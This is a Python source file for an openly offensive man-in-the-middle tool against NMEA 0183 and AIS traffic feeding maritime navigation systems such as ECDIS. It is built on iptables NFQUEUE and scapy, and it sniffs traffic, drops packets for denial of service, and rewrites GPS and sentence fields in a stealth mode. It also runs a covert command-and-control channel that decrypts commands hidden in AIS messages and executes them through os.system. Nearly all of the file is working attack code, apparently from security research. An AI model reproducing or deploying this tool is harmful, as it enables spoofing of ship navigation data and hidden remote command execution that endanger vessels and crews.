'''
Script to perform MITM on NMEA 0183 serial commnuication
This scipt will allow evasdroping and packet manipulation of NMEA sentence
'''
from Crypto.Cipher import AES
from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import argparse
from pyais import *
from NMEA import NMEA
import json
from Attributes import attributes
#from Crypto.Cipher import AES

gps_attr_targets = None

class MITM:
    def __init__(self, target_ip,  src_ip, option, config_data = None):
        
        self.target_ip = target_ip
        self.src_ip = src_ip
        self.src_mac = None
        self.target_mac = None
        self.nfqueue = NetfilterQueue()
        self.pkt = None
        self.config_data = config_data
        self.target_sentences = list(config_data.keys()) if option == "M" and config_data else None
        self.option = option
        self.target_attr = list(config_data["attributes"]) if option == "A" and config_data else None
        self.KEY = b"sixteen byte key"

        # AIS CC, parameters
        # self.decrypt_cipher = AES.new(self.KEY, AES.MODE_EAX, nonce = self.KEY)
        self.sentence_count = 0
        self.trigger_received = False
        self.received_cipher =  ""
        self.cc_option = None
        self.filename  = None

    def ais_cc(self, packet):
        #print(f"[*] Running in AIS CC mode")
        pkt = packet.get_payload()
        pktIP = IP(pkt)
            
        payload = "".join(map(chr, bytes(pktIP[TCP].payload)))
        payload_split = payload.split(",")
        sentence_type = payload_split[0][1:]
        if sentence_type == "AIVDM":
            num_of_fragments = int(payload_split[1])
        #print(payload, payload_split)    
        if pktIP.haslayer(TCP) and pktIP.src == self.src_ip and pktIP[TCP].dport == 4000 and sentence_type == "AIVDM" and num_of_fragments == 1:
            print("-"*20)
            print(f"[*] AIS Packet Intercepted with payload \n{payload}")
    
            nmea_ais = NMEA(sentence = payload)
            nmea_ais.decode()
            decoded_ais = nmea_ais.data #['data'].decode()

            if self.trigger_received and decoded_ais['msg_type'] == 8 and decoded_ais['mmsi'] == 366053209 and self.sentence_count != 0:
                self.received_cipher += decoded_ais['data'].decode()
                self.sentence_count -= 1
            
            if self.trigger_received and self.sentence_count == 0:
                self.received_cipher = bytes.fromhex(self.received_cipher)
                decrypt_cipher = AES.new(self.KEY, AES.MODE_EAX, nonce = self.KEY)
                plaintext = decrypt_cipher.decrypt(self.received_cipher)
                data = plaintext if self.cc_option == "CMD" else self.filename
                print(f"[*] Payload decryped and decoded......{data}")
                if self.cc_option == "CMD":
                    print(f"[*] Executing command")
                    os.system(plaintext.decode())
                if self.cc_option == "FILE":
                    print(f"[*] Writing payload to a file....{self.filename}")
                    out_file = open(self.filename,'w')
                    out_file.write(plaintext.decode())
                    out_file.close()
                
                self.trigger_received = False
                self.received_cipher = ""
        
            if decoded_ais['msg_type'] == 8 and decoded_ais['mmsi'] == 366053209 and not self.trigger_received:
                data = str(decoded_ais['data'].decode()).split(":")
                if len(data) >= 3 and data[0] == "CCSTART":
                    self.cc_option = data[1]
                    self.sentence_count = int(data[2])
                    self.trigger_received = True
                    if self.cc_option == "FILE":   
                        self.filename = data[3]
                    print(f"[*] Trigger received, waiting for {self.cc_option}")

        packet.accept()

    def sniff(self, packet):
            print("[*] Running Sniffing Attack")
            pkt = packet.get_payload()
            pktIP = IP(pkt)
            
            payload = "".join(map(chr, bytes(pktIP[TCP].payload)))
            
            if pktIP.haslayer(TCP) and pktIP.src == self.src_ip and pktIP[TCP].dport == 4000:
                print("-"*20)
                print(f"[*] Packet Intercepted with payload \n{payload}") 
            packet.accept()
    
    def dos(self, packet):
        print("[*] Running DoS Attack")
        pkt = packet.get_payload()
        pktIP = IP(pkt)
        
        payload = "".join(map(chr, bytes(pktIP[TCP].payload)))
        
        if pktIP.haslayer(TCP) and pktIP.src == self.src_ip and pktIP[TCP].dport == 4000:
            print("."*2)
            print(f"[*] Packet Intercepted and Dropped with payload \n{payload}")
            ack_pkt = IP(src=pktIP[IP].dst, dst=pktIP[IP].src)/TCP(sport=pktIP[TCP].dport, dport=pktIP[TCP].sport, seq=pktIP[TCP].ack, ack=pktIP[TCP].seq + len(pktIP[TCP].payload), flags='A')
            send(ack_pkt)
            packet.drop()
        else:
            packet.accept()

    def modify(self, packet):
        pkt = packet.get_payload()
        pktIP = IP(pkt)
        
        payload = "".join(map(chr, bytes(pktIP[TCP].payload)))
        
        try:
            if pktIP.haslayer(TCP) and pktIP.src == self.src_ip and pktIP[TCP].dport == 4000:
                print("-"*20)
                sentence_type = payload.split(",")[0][1:]

                if sentence_type in self.target_sentences:

                    print(f"[*] Packet Intercepted with payload \n{payload}")

                    old_len = len(pktIP[TCP].payload)
                    pktIP[TCP].remove_payload()
                    
                    nmea_obj = NMEA(sentence=payload)
                    nmea_obj.decode()

                    for attribute in list(self.config_data[sentence_type]['attributes']):
                        if attribute['incremental']:
                            nmea_obj.modify_attr(attribute['key'], str(float(nmea_obj.data[attribute['key']]) + attribute['value']))
    
                        else:
                            nmea_obj.modify_attr(attribute['key'], attribute['value'])
                    
                    #print(nmea_obj.sentence)
                    pktIP[TCP].add_payload(str(nmea_obj.sentence))
                    print(f"\n[*] Payload modified and sending...\n{nmea_obj.sentence}\n")
                    
                    new_len = len(pktIP[TCP].payload)
                    pktIP[IP].len = pktIP[IP].len + (new_len - old_len)
                    del pktIP[IP].chksum
                    del pktIP[TCP].chksum
                    
                    pkt = pktIP.__class__(bytes(pktIP))
                    packet.set_payload(bytes(pkt))

        except Exception as e:
           print(e)

        packet.accept()

    def stealth(self, packet):
        
        pkt = packet.get_payload()
        pktIP = IP(pkt)
        
        payload = "".join(map(chr, bytes(pktIP[TCP].payload)))
        
        try:
            if pktIP.haslayer(TCP) and pktIP.src == self.src_ip and pktIP[TCP].dport == 4000:
                print("-"*20)
                sentence_type = payload.split(",")[0][3:]
                attr_to_modify = list()
                for attr in self.target_attr:
                    if sentence_type in attributes.keys() and attr['key'] in attributes[sentence_type]:
                        attr_to_modify.append(attr)
                
                if len(attr_to_modify) > 0:    
                    print(f"[*] Packet Intercepted with payload \n{payload}")
                
                    old_len = len(pktIP[TCP].payload)
                    pktIP[TCP].remove_payload()
                    
                    nmea_obj = NMEA(sentence=payload)
                    nmea_obj.decode()

                    for attr in attr_to_modify:
                        if attr['incremental']:
                            nmea_obj.modify_attr(attr['key'], str(float(nmea_obj.data[attr['key']]) + attr['value']))            
                        else:
                            nmea_obj.modify_attr(attr['key'], attr['value'])
                                
                    #print(nmea_obj.sentence)
                    pktIP[TCP].add_payload(str(nmea_obj.sentence))
                    print(f"\n[*] Payload modified and sending...\n{nmea_obj.sentence}\n")
                    
                    new_len = len(pktIP[TCP].payload)
                    pktIP[IP].len = pktIP[IP].len + (new_len - old_len)
                    del pktIP[IP].chksum
                    del pktIP[TCP].chksum
                    
                    pkt = pktIP.__class__(bytes(pktIP))
                    packet.set_payload(bytes(pkt))

        except Exception as e:
           print(e)

        packet.accept()

    def setup(self):
        iptable_config = f"sudo iptables -A FORWARD -j NFQUEUE --queue-num 0 -d {self.target_ip}"
        os.system(iptable_config)
        #print(self.option)
        if self.option == "M":
            self.nfqueue.bind(0, self.modify)
            print("[*] Running in Sentence Modification mode")
        elif self.option == "A":
            self.nfqueue.bind(0, self.stealth)
            print("[*] Running in Attriute modification mode")
        elif self.option == "S":
            self.nfqueue.bind(0, self.sniff)
            print("[*] Running in Sniff mode")
        elif self.option == "D":
            self.nfqueue.bind(0, self.dos) 
        elif self.option == "C":
            self.nfqueue.bind(0, self.ais_cc)
            print("[*] Running in AIS CC")

    def clean_up(self):
        print("[*] Flushing iptables")
        os.system('iptables -F')
        os.system('iptables -X')

    def stop_mitm(self):
        self.clean_up()


def get_input():
    parser = argparse.ArgumentParser(description="NEMA MITM Tool")
    parser.add_argument("-t", "--target-ip", help="Target system IP address (Eg: ECDIS)", required=True)
    parser.add_argument("-s", "--source-ip", help="Source system IP address", required=True)
    parser.add_argument("-c", "--config", help="JSON config file")
    parser.add_argument("-o", "--option", help="M - mitm nmea modification attack, A - stealth GPS nmea attribute attack, S - Sniffing attack, D - DoS attack, C - AIS Command & Control mode", required=True)
   # parser.add_argument("-a", "--attr", help="nmea GPS attribute comma separated names")

    args = parser.parse_args()
    return args

def read_config(config_file):
    return json.load(open(config_file,'r'))

# # def read_attr(attrs):
#     global gps_attr_targets
#     gps_attr_targets = attrs.split(",")
#     return gps_attr_targets

if __name__ == '__main__':
    args = get_input()
    # if args.option == "I" and args.filename:
    #     read_file(args.filename)
    # elif args.option == "I" and not args.filename:
    #     print("No input file specified for injection")
    #     exit()
    mitm = MITM(args.target_ip, args.source_ip, args.option, read_config(args.config) if args.config else None)
    mitm.setup()
    
    try:
        print("[*] waiting for data")
        mitm.nfqueue.run()
        
    except KeyboardInterrupt:
        mitm.stop_mitm()

    mitm.nfqueue.unbind()
